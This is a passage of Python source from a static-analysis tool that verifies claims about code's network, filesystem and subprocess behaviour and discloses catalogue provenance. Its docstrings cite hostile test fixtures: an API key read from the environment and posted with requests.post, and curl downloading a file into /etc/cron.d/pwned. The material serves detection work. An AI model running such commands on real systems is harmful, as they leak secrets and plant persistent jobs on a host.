    grant. Since INV-buzab a call the catalogue CLASSIFIED is what *examined*
    means, so a row carrying the wrong boundary converts an unexamined call
    into an examined one that produces no chain for the boundary actually
    claimed. Measured on one fixture posting ``os.environ["API_KEY"]`` through
    ``requests.post``, claim "never sends data over the network", the middle
    run being the control that proves the row matched::

        no overlay                            inconclusive   rc 2
        requests.post declared net_send       violated       rc 1
        requests.post declared fs_read        CONFIRMED      rc 0

    THE TWO LAYERS ARE KEPT APART ON PURPOSE. A catalogue passed on the
    command line comes from whoever RAN the tool. One reached through the
    claims file's ``extra_catalogs:`` travels WITH the repository — and when
    the claims file and its catalogues live inside the tree under analysis,
    the subject is supplying its own grading criteria. Reproduced: a directory
    holding ``main.py``, ``claims.yaml`` and an overlay filing
    ``requests.post`` under ``fs_read`` returns ``confirmed`` rc 0, where the
    same repo without the ``extra_catalogs:`` line returns ``inconclusive``
    rc 2. Collapsing the layers would report THAT a catalogue was used while
    hiding WHO supplied it, which is the more decision-relevant half.

    THIS CHANGES NO VERDICT. It is disclosure, deliberately chosen over
    restriction: refusing user catalogues would close the case ADR-0016 §27
    created the overlay channel for (cataloguing third-party egress so it
    becomes visible), and the honest gap was never that users can extend the
    catalogue — it was that doing so left no trace on the answer.

    Args:
        layers: kind -> (CLI-supplied paths, claims-file-supplied paths).
            Every key in :data:`_PROVENANCE_KINDS` is emitted whether or not
            it appears here.

    NAMING THE FILE IS NOT ENOUGH FOR ONE KIND OF LINE (INV-tabaf). Everything
    a user can write ADDS knowledge except ``module_completeness``, which
    converts the ABSENCE of knowledge into evidence: it is a CLOSED-WORLD claim
    that an unmatched call into that module is an EXAMINED negative. Measured
    hazard: a six-line overlay with zero primitive rows and one entry for
    ``telnetlib`` turned the INV-buzab exfiltration fixture from
    ``inconclusive`` rc 2 to ``confirmed`` rc 0. A reader holding
    ``io_primitives: overlays/deps.yaml [claims-file extra_catalogs]`` cannot
    tell whether that file added a ``requests.post`` row or vouched for the
    whole of ``telnetlib``, and those are not comparable claims. So the grants
    are enumerated separately, by MODULE.

    Returns:
        ``{"user_supplied": bool, "layers": {kind: {"cli": [...],
        "claims_file": [...]}}, "completeness_grants": [...]}`` — paths as
        strings, exactly as the user wrote them, so a reader can find the file;
        one grant record per overlay that vouched for at least one module.
    """
    out: dict[str, dict[str, list[str]]] = {}
    any_user = False
    for kind in _PROVENANCE_KINDS:
        cli_paths, claims_paths = layers.get(kind, ((), ()))
        cli_list = [str(p) for p in cli_paths]
        claims_list = [str(p) for p in claims_paths]
        any_user = any_user or bool(cli_list) or bool(claims_list)
        out[kind] = {"cli": cli_list, "claims_file": claims_list}
    io_cli, io_claims = layers.get("io_primitives", ((), ()))
    grants = [
        *_completeness_grants(io_cli, "cli"),
        *_completeness_grants(io_claims, "claims_file"),
    ]
    return {
        "user_supplied": any_user,
        "layers": out,
        "completeness_grants": grants,
    }


def _completeness_grants(
    paths: "Sequence[Path]", origin: str,
) -> list[dict[str, Any]]:
    """One record per overlay that vouches for at least one module.

    THE OVERLAY IS LOADED A SECOND TIME HERE, PURELY TO DESCRIBE IT, and that
    is why every failure is swallowed. The real load has already happened by
    the time a verdict exists — if the overlay was malformed the run ended with
    an error, and if it was fine this one will be too. A describe-step that can
    fail a run it is only reporting on turns a disclosure into an outage, so
    the exception arm returns nothing and the INV-zosun path line still names
    the file.

    ``module_completeness`` is an ``io_primitives`` concept, so only that layer
    is scanned; looking for the key in a taint catalogue would be looking for
    it in a schema that has none.
    """
    import logging

    from .io_boundary import load_overlay_catalog

    grants: list[dict[str, Any]] = []
    for path in paths:
        try:
            overlay = load_overlay_catalog(Path(path))
        except Exception as exc:
            # Logged rather than swallowed silently, but still not raised: see
            # the docstring. Debug level because on the only path that reaches
            # here the user has already been told, loudly, by the real load.
            logging.getLogger(__name__).debug(
                "completeness-grant disclosure could not re-read %s: %s",
                path, exc,
            )
            continue
        modules = sorted(overlay.module_completeness)
        if not modules:
            continue
        grants.append({
            "path": str(path),
            "origin": origin,
            "language": overlay.language,
            "modules": modules,
        })
    return grants


def render_catalog_provenance_text(provenance: dict[str, Any]) -> list[str]:
    """The same disclosure for a reader who did not ask for JSON.

    A disclosure that exists only under ``--json`` is half shipped — this
    file's own precedent, recorded on INV-karud (a3) when WI-bifob's exclusion
    bucket reached the dataclass and never the text renderer. Renders to
    nothing when the run used only the shipped catalogue, so ordinary output
    is unchanged.
    """
    if not provenance.get("user_supplied"):
        return []
    lines = [
        "",
        "NOTE: these verdicts were computed against USER-SUPPLIED catalogue "
        "input.",
    ]
    for kind, layer in sorted(provenance.get("layers", {}).items()):
        for origin, label in (("cli", "CLI flag"),
                              ("claims_file", "claims-file extra_catalogs")):
            for path in layer.get(origin, []):
                lines.append(f"  {kind}: {path}  [{label}]")
    lines.append(
        "  A verdict is only as truthful as the catalogue behind it: a row "
        "with the wrong",
    )
    lines.append(
        "  boundary makes a call count as EXAMINED without producing a chain "
        "for the",
    )
    lines.append(
        "  boundary claimed. Where a claims-file catalogue ships inside the "
        "analysed repo,",
    )
    lines.append("  the repository is supplying its own criteria (INV-zosun).")

    # INV-tabaf: the ONE line that needs naming by MODULE. Everything else a
    # user writes ADDS knowledge; a completeness grant converts the ABSENCE of
    # knowledge into evidence, so a reader who cannot see what was vouched for
    # cannot weigh the verdict. Rendered as its own block rather than folded
    # into the path list above, because "this file was used" and "this file
    # closed the world over telnetlib" are not the same size of fact.
    grants = provenance.get("completeness_grants") or []
    if grants:
        lines.append("")
        lines.append(
            "  COMPLETENESS GRANTS — these modules were vouched for as fully "
            "enumerated,",
        )
        lines.append(
            "  so an unmatched call into one counts as an EXAMINED negative "
            "(closed-world):",
        )
        for grant in grants:
            label = (
                "CLI flag" if grant.get("origin") == "cli"
                else "claims-file extra_catalogs"
            )
            modules = ", ".join(grant.get("modules") or ())
            lines.append(
                f"    {grant.get('language')}: {modules}",
            )
            lines.append(
                f"      from {grant.get('path')}  [{label}]",
            )
    return lines


def validate_taint_flow_vocabulary(
    claims: list["Claim"],
    source_labels: "AbstractSet[str]",
    sink_zones: "AbstractSet[str]",
) -> None:
    """Reject a ``taint_flow`` claim naming a label or zone nothing can match.

    THE SECOND HALF OF A RULE THAT SHIPPED WITH ONLY ITS FIRST HALF
    (INV-todas). ``load_claims`` has validated ``constraint.boundary`` against
    ``KNOWN_IO_BOUNDARIES`` since INV-gobob / WI-ruzib, and the comment there
    states the mechanism precisely: *"An unknown value here would otherwise
    make verify_claim's boundary_map.entries.get return None → chain_count 0 →
    silent 'confirmed'."* The taint arm has the identical shape —
    :func:`verify_claim` keeps only findings where
    ``f.taint_label == tf.source_taint and f.sink_zone ==
    tf.prohibited_sink_zone`` — and got no check, so the reasoning was written
    down and applied to one of the two constraint vocabularies.

    Measured on the shipped CLI, one fixture that really leaks
    (``os.environ["API_KEY"]`` written through ``open(...).write``), with the
    boundary arm as a control behaving correctly in the same command::

        source_taint: secret_material          -> confirmed  rc 0   FAILS OPEN
        prohibited_sink_zone: host_filesystem  -> confirmed  rc 0   FAILS OPEN
        boundary: net_sends                    -> Error      rc 2   fails CLOSED
        (correct: host_secret / host_fs)       -> violated   rc 1   control

    WHY IT TAKES THE VOCABULARIES AS ARGUMENTS INSTEAD OF DERIVING THEM.
    ``KNOWN_IO_BOUNDARIES`` is a constant; these are not. A project-local
    ``--taint-sinks`` file may declare a zone no built-in catalogue mentions,
    so the sets must come from the RESOLVED catalogue — which is why the caller
    is ``cmd_verify_claims`` after ``load_full_taint_catalog``, not
    ``load_claims``. Passing them in also keeps the heavy ``taint`` import out
    of this module's import path.

    DISCLOSED COST: because the resolved catalogue is assembled after the
    behavior map, a typo is reported after analysis rather than before it.
    That is strictly better than confirming, and worse than failing fast;
    hoisting the catalogue load ahead of ``_get_or_run_analysis`` is filed
    separately rather than folded into a security fix.

    Raises:
        ClaimsFileError: naming the offending value, the full vocabulary, and
            a did-you-mean suffix — the vocabulary is not discoverable
            anywhere else on the error path.
    """
    for claim in claims:
        tf = claim.constraint_taint_flow
        if tf is None:
            continue
        for value, vocabulary, field_name in (
            (tf.source_taint, source_labels, "source_taint"),
            (tf.prohibited_sink_zone, sink_zones, "prohibited_sink_zone"),
        ):
            # An EMPTY value is a different defect (an absent key) and is left
            # to the existing shape validation; refusing it here would change
            # the error a malformed claim already gets.
            if not value or value in vocabulary:
                continue
            raise ClaimsFileError(
                f"unknown {field_name} '{value}' in claim '{claim.id}'; "
                f"valid values: {', '.join(sorted(vocabulary))}."
                + _did_you_mean(value, vocabulary),
            )


def _parse_claim(entry: object, index: int) -> Claim:
    """Validate and build one :class:`Claim` from a raw YAML entry.

    Enforces the per-entry half of the load gate: the entry must be a
    mapping with only allowed keys; ``constraint`` (if present) must be a
    mapping with only allowed keys; a present ``constraint.boundary`` must
    be in :data:`~hypergumbo_core.io_boundary.KNOWN_IO_BOUNDARIES`.
    """
    if not isinstance(entry, dict):
        raise ClaimsFileError(
            f"claim #{index + 1} must be a mapping, "
            f"got {type(entry).__name__}.",
        )
    claim_id = entry.get("id") or f"#{index + 1}"
    _reject_unknown_keys(
        entry.keys(), _ALLOWED_CLAIM_KEYS, where=f"claim '{claim_id}'",
    )

    constraint = entry.get("constraint")
    if constraint is None:
        constraint = {}
    if not isinstance(constraint, dict):
        raise ClaimsFileError(
            f"constraint in claim '{claim_id}' must be a mapping, "
            f"got {type(constraint).__name__}.",
        )
    _reject_unknown_keys(
        constraint.keys(),
        _ALLOWED_CONSTRAINT_KEYS,
        where=f"constraint in claim '{claim_id}'",
    )

    # Boundary-vocabulary check (INV-gobob / WI-ruzib). Validate against the
    # canonical universe, NOT the keys present in a given boundary map: a
    # repo with zero net_send chains must still accept a
    # ``must_not_exist: net_send`` claim and confirm it. An unknown value
    # here would otherwise make verify_claim's ``boundary_map.entries.get``
    # return None → chain_count 0 → silent "confirmed".
    boundary = constraint.get("boundary", "") or ""
    if boundary and boundary not in KNOWN_IO_BOUNDARIES:
        raise ClaimsFileError(
            f"unknown boundary '{boundary}' in claim '{claim_id}'; valid "
            f"boundaries: {', '.join(sorted(KNOWN_IO_BOUNDARIES))}."
            + _did_you_mean(boundary, KNOWN_IO_BOUNDARIES),
        )

    taint_flow = _parse_taint_flow(constraint.get("taint_flow"), claim_id)

    return Claim(
        id=entry.get("id", ""),
        text=entry.get("text", ""),
        constraint_boundary=boundary,
        constraint_must_not_exist=constraint.get("must_not_exist", False),
        constraint_max_chains=constraint.get("max_chains"),
        constraint_taint_flow=taint_flow,
    )


def load_claims(path: Path) -> list[Claim]:
    """Load and validate security claims from a YAML file.

    Validates the file before constructing any :class:`Claim` (the
    META-jurig ``load_claims`` gate), raising :class:`ClaimsFileError` on
    the first failure so a malformed or typo'd claims file errors loudly
    instead of tracebacking or silently producing a degraded verdict
    stream:

    1. **Readability / shape** (WI-fuhaf): ``path`` must be a file (not a
       directory), decode as UTF-8 text, and parse to a top-level mapping
       with a list-valued ``claims:`` key. An empty file, ``{}``,
       ``claims: []``, ``claims: null`` / ``~``, and an absent ``claims:``
       key all mean "no claims" and load to ``[]``.
    2. **YAML well-formedness** (INV-zurih): ``yaml.YAMLError`` is caught
       and re-raised naming the file and reason.
    3. **Field names** (WI-bopoz): every top-level, claim, constraint, and
       taint-flow key is checked against an allowlist with a did-you-mean
       hint.
    4. **Boundary vocabulary** (INV-gobob / WI-ruzib): a present
       ``constraint.boundary`` must be one of
       :data:`~hypergumbo_core.io_boundary.KNOWN_IO_BOUNDARIES`.

    Args:
        path: Path to the claims YAML file.

    Returns:
        List of Claim objects (possibly empty).

    Raises:
        ClaimsFileError: on any of the validation failures above.
    """
    if path.is_dir():
        raise ClaimsFileError(
            f"claims path is a directory, not a file: {path}",
        )
    try:
        content = path.read_text(encoding="utf-8")
    except UnicodeDecodeError as exc:
        raise ClaimsFileError(
            f"claims file is not valid UTF-8 text: {path}",
        ) from exc
    try:
        data = yaml.safe_load(content)
    except yaml.YAMLError as exc:
        raise ClaimsFileError(
            f"could not parse claims file {path}: {exc}",
        ) from exc

    if data is None:
        data = {}
    if not isinstance(data, dict):
        raise ClaimsFileError(
            f"claims file must have a top-level mapping with a 'claims:' key, "
            f"got {type(data).__name__}: {path}",
        )
    _reject_unknown_keys(
        data.keys(), _ALLOWED_TOP_LEVEL_KEYS, where="top-level",
    )

    raw_claims = data.get("claims")
    if raw_claims is None:
        raw_claims = []
    if not isinstance(raw_claims, list):
        raise ClaimsFileError(
            f"'claims:' must be a list, got {type(raw_claims).__name__}: {path}",
        )

    return [_parse_claim(entry, index) for index, entry in enumerate(raw_claims)]


# ---------------------------------------------------------------------------
# Verification
# ---------------------------------------------------------------------------


# Analyzer-produced call edge types used to decide per-language I/O coverage.
# A deliberately registry-clean subset of the edge types ``io_boundary``'s
# ``tag_io_boundaries`` scans (all relationship axis). It omits the
# bridge-family endpoint_shape values (``cgo_bridge``/``wasm_bridge``/...)
# that the tagger lists defensively: those fold into the canonical ``calls``
# relationship (edge_types.py), so a folded FFI edge is already counted via
# ``calls`` — and they are not relationship-axis edge types, so listing them
# here would (correctly) fail the ADR-0023 drift linter. The folded gRPC
# RPC-implementation edge (``implements`` + ``meta['protocol']='grpc'``,
# audit-findings 0016) is counted via the is_grpc_rpc_implementation predicate
# at the loop below, not membership. This set answers "did the analyzer extract
# call structure for this language", which is what the WI-kajil blindness
# signal needs.
_COVERAGE_CALL_EDGE_TYPES: frozenset[str] = frozenset({
    "calls",
    "imports",
    "module_attr_ref",
    "event_publishes",
})


#: How many uncatalogued modules to name in the reason string. A reason is read by
#: a human deciding whether to trust a verdict, so it names the libraries rather
#: than reporting a bare count — but a repo with 200 dependencies would otherwise
#: emit an unreadable wall, so the tail is summarised.
_MAX_REPORTED_UNCATALOGUED_MODULES = 5

#: Terminal id slots that mark a ``dst`` as leaving the repo. An external call is
#: the only thing that can BE an I/O primitive, so it is the only thing the catalog
#: is asked to adjudicate; an in-repo callee carries no catalog question.
#:
#: NOT A ``Symbol.kind`` SET, which is why it is not named one. The slot carries two
#: vocabularies: ``external_symbol`` is a registered ADR-0027 symbol kind (a minted
#: external node), while ``unresolved`` is the terminal token
#: :func:`ir.format_legacy_dst` hardcodes for an ``ExternalRef`` that never became a
#: node. Naming this ``_EXTERNAL_DST_KINDS`` made ``check-symbol-kind-drift``
#: correctly report ``unresolved`` as absent from the registry — the linter was
#: right and the name was wrong. That one slot spells two vocabularies is a real
#: oddity (INV-kurup's family: identifier-bearing fields emitting non-canonical
#: formats from several paths); it is recorded here, not fixed here.
_EXTERNAL_DST_TERMINAL_SLOTS: frozenset[str] = frozenset({
    "external_symbol",
    "unresolved",
})

#: Edge types that are a CALL SITE the catalog could have classified.
#:
#: DELIBERATELY NOT :data:`_COVERAGE_CALL_EDGE_TYPES`, which answers a different
#: question ("did the analyzer extract call structure for this language") and
#: therefore includes ``imports``. An import performs no I/O — ``import
#: requests`` is not a network send, ``requests.get(...)`` is — so counting
#: import edges here reports every module a repo merely MENTIONS as an
#: unexamined I/O risk. Measured on poetry: import edges alone contributed 231
#: of 258 reported modules. ``instantiates`` IS included because a constructor
#: is a genuine classification opportunity — ``socket.socket()`` is a catalogued
#: primitive.
#: INV-lalad: the ``calls`` + ``instantiates`` half is the CALL FAMILY and is
#: now read from the registry rather than restated, so this set and
#: ``taint.TAINT_CALL_EDGE_TYPES`` agree by construction instead of by
#: coincidence. ``module_attr_ref`` stays an explicit local addition — it is an
#: attribute READ, not an invocation, so it is not a call-family member.
_CALL_SITE_EDGE_TYPES: frozenset[str] = call_family_edge_types() | frozenset({
    "module_attr_ref",
})


def _analyzed_modules(raw_edges: list[dict[str, Any]]) -> set[str]:
    """Module-shaped names whose SOURCE this analysis actually read.

    Derived from the ``src`` side, which always names an in-repo symbol and so
    always carries a file path (``python:app/config.py:3-9:load:function``);
    the separator is normalised so ``app/config`` compares against a dotted
    ``app.config``. Nodes are not consulted — every analyzed file that
    participates in any edge appears here, and the function's callers already
    hold the edges.

    THAT NORMALISATION WAS ONE-SIDED FOR AS LONG AS IT EXISTED, and the
    docstring above described the intent while the code did half of it
    (INV-juvul, L50 again). Only this side was folded; the callee side reached
    :func:`_is_analyzed_module` raw, so express's own ``lib/utils`` could not
    match its own analyzed ``lib.utils`` and the repo's own module was reported
    as an unexamined third-party one. Both sides now route through
    :func:`io_boundary.normalize_module_separators`, which is the single home
    for the fold.
    """
    analyzed: set[str] = set()
    from .taint import _module_from_symbol_path

    for edge in raw_edges:
        module = _module_from_symbol_path(edge.get("src", ""))
        if module:
            analyzed.add(normalize_module_separators(module))
    return analyzed


def _is_analyzed_module(module: str, analyzed: set[str]) -> bool:
    """Whether ``module`` names source this analysis read.

    Tests the WHOLE spelling, then ONE shortening step, because the module slot
    may carry a trailing class name — ``app.config.Loader`` for a callee defined
    in ``app/config.py``. It used to test EVERY dotted prefix down to a single
    component, which is INV-lakom: that also licensed ``os.path`` → ``os``, so a
    repo owning ``myapp/os/helpers.py`` vouched for the standard library ``os``
    and the disclosure went silent over an unexamined module. The bounds and the
    reasoning for each are at the call site below.

    EACH PREFIX IS MATCHED AS A COMPONENT-BOUNDED SUFFIX of an analyzed path,
    not by set membership (INV-liloh). ``analyzed`` derives from SRC file paths
    — ``packages.hypergumbo-core.src.hypergumbo_core.cli`` — while an
    unresolved callee slot carries the IMPORT name — ``hypergumbo_core.scip``
    — and exact membership can never bridge the packaging prefix, so every
    src-layout repo's own modules read as catalogue gaps in a gate whose
    whole purpose is to exclude them. The suffix relation was always the
    stated contract (:func:`_module_from_symbol_path`'s docstring:
    "suffix-matches hypergumbo_core.cli"); the membership test never
    implemented it.

    The relation is a component-bounded INFIX, not a suffix: an analyzed
    entry keeps its file stem (``….hypergumbo_core.scip.loader``), so the
    callee package ``hypergumbo_core.scip`` appears INSIDE it, dot-bounded on
    both sides. Bounding at components is load-bearing — ``hypergumbo_core``
    ends with ``core`` while sharing no component, and a bare string
    containment is the rule that was measured wrong in three languages at
    once.

    BOTH SIDES ARE NOW SEPARATOR-NORMALISED (INV-juvul). ``analyzed`` was
    folded and the argument was not, which made the comparison unable to see a
    match in any language that spells a module with ``/`` or ``::`` — the
    express case above, and every Go import path.

    WHAT THAT WIDENS, stated precisely because a first draft of this paragraph
    overstated it and the overstatement was refuted by running it: the folded
    spelling is tested WHOLE, so the only new suppression is a module whose
    ENTIRE path is a component-bounded infix of a path this analysis read.
    ``github.com/other/modules/caddyhttp`` is NOT suppressed by a repo owning
    ``modules/caddyhttp`` — the folded module is longer than the analyzed entry
    and the infix runs the other way. Measured on caddy (19,650 edges), the
    widening is exactly TWO entries, ``modules/caddyhttp`` and
    ``caddyconfig/httpcaddyfile``, both of which are caddy's own packages.
    Pinned in both directions by
    ``test_a_repos_own_slash_spelled_package_IS_suppressed`` and
    ``test_normalisation_alone_does_not_vouch_for_an_unread_module``.

    WHAT THIS FUNCTION STILL CANNOT ANSWER, and why it is no longer the only
    test: a callee slot carrying a RESERVED KEYWORD (``crate::``, ``super::``)
    or a RELATIVE PATH (``../post``) names first-party code under no
    normalisation at all, because a keyword is not a name and a relative
    specifier is meaningless until resolved against the importing file. That
    question belongs to the language, and
    :func:`io_boundary.is_definitionally_first_party` answers it.
    """
    parts = module.split(".")
    if _component_infix_of_any(module, analyzed):
        return True
    # SHORTENING IS BOUNDED BY ITS OWN PURPOSE (INV-lakom). It exists to strip
    # a trailing TYPE name off a callee slot -- ``app.config.Loader`` for a
    # callee defined in ``app/config.py`` -- and that is ONE component. It was
    # unbounded, walking every prefix down to a single component, so it equally
    # licensed ``os.path`` -> ``os`` and ``crypto.tls`` -> ``crypto``. Measured:
    # a repo owning ``myapp/os/helpers.py`` and calling ``os.path.join``
    # reported coverage COMPLETE over the standard library ``os`` -- a clean
    # verdict over a module nothing examined, produced by a directory-name
    # collision.
    #
    # TWO BOUNDS, EACH FOR ITS OWN REASON.
    #   ONE STEP, because that is the length of a type name. A nested class
    #     (``app.config.Loader.Inner``) would need two and is NOT licensed;
    #     it reports a gap, which is the safe direction.
    #   NEVER TO A SINGLE COMPONENT, because a bare ``os`` / ``crypto`` /
    #     ``json`` / ``time`` is precisely the spelling that collides with an
    #     ordinary directory name -- and the analyzed set is matched as a
    #     component-bounded INFIX (it has to be, to tolerate packaging
    #     prefixes), which makes a one-component needle match almost anywhere.
    #
    # NOT "match the shortened form as a SUFFIX instead", which was the first
    # design and is refuted by INV-liloh's own fixture: the src-layout callee
    # ``hypergumbo_core.scip._generated`` shortens to ``hypergumbo_core.scip``,
    # which sits INSIDE
    # ``packages.hypergumbo-core.src.hypergumbo_core.scip.loader`` and is not a
    # suffix of it. A suffix rule would have re-broken that.
    if len(parts) >= 3 and _component_infix_of_any(
        ".".join(parts[:-1]), analyzed,
    ):
        return True
    # THE SEPARATOR FOLD IS TESTED WHOLE, NEVER SHORTENED, and the asymmetry is
    # the whole point (INV-juvul). Folding first and then running the loop above
    # is what the first cut did, and CADDY REFUTED IT IN THE CONTROL RUN: with
    # ``/`` folded, ``os/exec`` becomes two components, the loop shortens it to
    # ``os``, and caddy's own ``internal/filesystems/os.go`` matches — so the
    # SUBPROCESS module was suppressed from the disclosure, along with
    # ``crypto/tls``, ``crypto/x509`` and seven more of Go's stdlib, because the
    # repo happens to own a file called ``crypto.go``. Thirteen suppressions,
    # ten of them wrong, all in the false-clean direction.
    #
    # Shortening is for stripping a trailing TYPE off a dotted callee slot
    # (``app.config.Loader`` → ``app.config``); it is not licensed by a change
    # of separator. So the folded spelling gets exactly one question — does the
    # WHOLE module name a path this analysis read — which is what express's
    # ``lib/utils`` vs ``lib.utils`` needed and all it needed.
    folded = normalize_module_separators(module)
    if folded != module and _component_infix_of_any(folded, analyzed):
        return True
    return False


def _component_infix_of_any(name: str, analyzed: set[str]) -> bool:
    """Whether ``name`` sits inside any analyzed path, bounded at components.

    Bounding is load-bearing and was measured wrong in three languages at once:
    ``hypergumbo_core`` ends with ``core`` while sharing no component, so bare
    string containment matches paths that name unrelated code.
    """
    needle = "." + name + "."
    for a in analyzed:
        if a == name or needle in "." + a + ".":
            return True
    return False


def _edge_dst_ref(edge: dict[str, Any]) -> Any:
    """The serialized edge's structured external target, or ``None``.

    WI-tihup put a richer ``dst_ref`` beside the colon-packed dst, and the
    tagger prefers it. The gate must prefer it too or the two disagree about
    which module a call names — which is the whole failure this reuse exists to
    prevent. Imported lazily because ``ir`` is heavy and only this path needs it.
    """
    raw = edge.get("dst_ref")
    if not raw:
        return None
    from .ir import ExternalRef

    return ExternalRef.from_dict(raw)


def _external_call_sites(
    raw_edges: list[dict[str, Any]],
    catalogs: dict[str, IoBoundaryCatalog],
) -> Iterator[tuple[dict[str, Any], str, IoBoundaryCatalog]]:
    """Every call site this analysis made into an EXTERNAL, catalogued-language target.

    THE ONE DEFINITION OF THE POPULATION the coverage checks adjudicate, yielding
    ``(edge, dst, catalog)``. Extracted when a second consumer appeared
    (:func:`_opaque_launch_sites`) rather than after they drifted, because the
    drift is the documented failure mode here: INV-motos was two callers sharing
    one predicate but running it over DIFFERENT populations — the gate counted
    ``instantiates`` call sites the tagger could not tag — and no amount of
    sharing ``classify_call`` would have caught it. Sharing the predicate is not
    enough; the ITERATION has to be shared too.

    Three filters, each load-bearing:

    * ``_CALL_SITE_EDGE_TYPES`` — a call site the catalog could have classified,
      deliberately excluding ``imports`` (see that constant).
    * the five-slot id shape with an EXTERNAL terminal slot — a first-party
      callee's I/O was examined on its own edges, not here.
    * a catalog for the language — with none there is no adjudication to
      attempt, and the language is caught earlier by the INV-dabov check in
      :func:`compute_boundary_coverage`, which is derived rather than passed in
      precisely so this skip cannot fail open.
    """
    for edge in raw_edges:
        if edge.get("type") not in _CALL_SITE_EDGE_TYPES:
            continue
        dst = edge.get("dst", "")
        parts = dst.split(":")
        # lang:module:span:name:kind — a well-formed id has all five.
        if len(parts) < 5 or parts[-1] not in _EXTERNAL_DST_TERMINAL_SLOTS:
            continue
        catalog = catalogs.get(parts[0])
        if catalog is None:
            continue
        yield edge, dst, catalog


def _launch_site_name(edge: dict[str, Any], dst: str) -> str:
    """``module.name`` for a launch, spelled the way the catalogue branch spells it.

    Both branches of :func:`_opaque_launch_sites` feed one disclosure string, so
    they have to agree: the catalogue branch joins ``primitive.module`` and
    ``primitive.name``, and a bash launch of ``curl`` reads ``curl.curl`` from
    either side.

    ``dst_ref`` IS PREFERRED FOR THE SAME REASON :func:`_edge_dst_ref` EXISTS —
    WI-tihup put a structured target beside the colon-packed id and the tagger
    reads it, so a gate reading the slots instead is how the two come to
    disagree about what a call names. The slot fallback is not defensive
    padding: only bash stamps a boundary today and it always sets ``dst_ref``,
    but the stamp is a producer contract that the next producer to adopt it may
    satisfy without one, and a five-slot id is guaranteed here because
    :func:`_external_call_sites` already rejected anything shorter.
    """
    ref = _edge_dst_ref(edge)
    if ref is not None:
        return ".".join(part for part in (ref.module_path, ref.name) if part)
    # SLOTS VIA THE CHOKEPOINTS (INV-divuf): ``parts[1]``/``parts[3]`` assume
    # a colon-free path AND name, and neither holds — an objc selector makes
    # ``parts[3]`` a truncation and a rust ``std::io`` makes ``parts[1]`` one.
    return ".".join(
        part for part in (symbol_path_slot(dst), symbol_name_slot(dst)) if part
    )


def _is_producer_stamped_launch(edge: dict[str, Any]) -> bool:
    """Did the ANALYZER itself declare this edge a launch? (INV-vokog)

    ONE HOME FOR ONE FACT. Two functions need this answer and they used to hold
    one copy between them: :func:`_opaque_launch_sites` read the stamp inline
    and :func:`_uncatalogued_external_modules` never asked at all, so the same
    edge was reported as a NAMED opaque door by one and as an UNEXAMINED module
    by the other. Those are contradictory findings about one call, and the
    contradiction was load-bearing — ``qualifying_only = not unknown`` meant a
    launch withheld the very verdict it triggered, making ADR-0016 §4's fourth
    verdict unreachable in any repo containing a shell script.

    THE STAMP IS THE ONLY EVIDENCE THESE EDGES WILL EVER CARRY. ADR-0016 rules
    out a bash io_primitives catalogue, so ``classify_call`` returns ``None``
    for ``curl`` / ``git`` / ``rm`` forever; asking the catalogue about them is
    asking the wrong oracle. A catalogue row can also classify a launch without
    describing it (``curl -> net_send`` is right about the send and silent about
    ``-o``), which is why the producer is asked FIRST in both consumers rather
    than as a fallback.

    Kept a predicate rather than folded into :func:`_external_call_sites`
    because the two consumers do OPPOSITE things with the answer — one collects
    the edge, the other skips it — so a filter at the source would have to be
    duplicated with inverted senses, which is the drift this exists to stop.
    """
    return (edge.get("meta") or {}).get("io_boundary") in PRODUCER_OPAQUE_BOUNDARIES


def _opaque_launch_sites(
    raw_edges: list[dict[str, Any]],
    catalogs: dict[str, IoBoundaryCatalog],
) -> list[str]:
    """Call sites where control leaves this process for a program we cannot see.

    INV-gahuz. The catalogue classified these calls CORRECTLY — ``subprocess.run``
    really is a subprocess primitive — and that is exactly why they were being
    read as examined negatives: :func:`_uncatalogued_external_modules` permits any
    call ``classify_call`` matches, which is right for every boundary that names
    a KNOWN surface and wrong for the one that names OPACITY. See
    :data:`~hypergumbo_core.io_boundary.OPAQUE_BOUNDARIES` for why ``subprocess``
    is the only such boundary a catalog can declare.

    MEASURED: ``subprocess.run(["curl", "-o", "/etc/cron.d/pwned", URL])`` returned
    ``confirmed`` rc 0 for both a ``fs_write`` and a ``net_send``
    ``must_not_exist`` claim, with ``open(f, "w")`` and ``socket.send`` controls
    returning ``violated`` rc 1 in the same session.

    TWO CHANNELS, ONE QUESTION (INV-larol). A catalogue is not the only thing
    that knows a call is a launch. The bash analyzer stamps
    ``meta.io_boundary = "command_launch"`` on an external-command edge because
    there is no bash catalogue to match against and ADR-0016 rules one out, so
    that stamp is the ONLY evidence of opacity those edges will ever carry.
    Consulting the catalogue alone left it unread. The producer stamp is
    therefore checked FIRST, before ``classify_call``: a catalogue row can
    classify a launch without describing it — ``curl -> net_send`` is right
    about the send and silent about the ``-o`` file write — and matching it is
    exactly what made the call an examined negative for every other boundary.

    Measured on the shipped CLI over a two-line script whose only command is
    ``curl -o /etc/cron.d/pwned <url>``, claim "never writes to the host
    filesystem": with no ``bash.yaml``, ``inconclusive`` rc 2; with six lines of
    ``curl -> net_send`` ``bash.yaml``, ``confirmed`` rc 0. Declaring
    ``subprocess`` alongside restored the refusal, which is the control showing
    the row matched and the BOUNDARY CHOICE — not the analyzer's sight —
    decided the verdict.

    Returns the QUALIFIED PRIMITIVE NAMES (``subprocess.run``), not the modules.
    A module name would be actively misleading here: the blocker is not that
    ``subprocess`` is uncatalogued — it is fully catalogued — but that this
    particular call hands control to something outside the analysis. Naming the
    call is also what makes the disclosure checkable against the source.
    """
    sites: set[str] = set()
    for edge, dst, catalog in _external_call_sites(raw_edges, catalogs):
        # THE PRODUCER CHANNEL, CHECKED BEFORE ``classify_call`` (INV-larol).
        # A catalogue row can CLASSIFY a launch without DESCRIBING it: a
        # ``curl -> net_send`` row is right about the send and silent about the
        # ``-o`` file write, and matching it is exactly what made the call an
        # examined negative for every other boundary. Asking the producer first
        # means a launch keeps its opacity no matter what a catalogue later
        # says about it, which is the difference between opacity being
        # structural and opacity being a favour the catalogue chooses to do.
        if _is_producer_stamped_launch(edge):
            sites.add(_launch_site_name(edge, dst))
            continue
        primitive = classify_call(
            catalogs, dst, edge.get("meta"), dst_ref=_edge_dst_ref(edge),
        )
        if primitive is None:
            continue
        # ASKED OF THE CATALOGUE, NOT OF THE RETURNED BOUNDARY. ``classify_call``
        # yields ONE primitive, so a call catalogued under two boundaries is
        # reported under whichever row wins — and ``primitive.boundary in
        # OPAQUE_BOUNDARIES`` therefore misses a launch whose other row is
        # found first. The parity test over the registry caught exactly that on
        # Scala the first time it ran; see ``declares_opaque_crossing``.
        if not catalog.declares_opaque_crossing(primitive.module, primitive.name):
            continue
        # Joined rather than branched on a missing module: no shipped catalogue
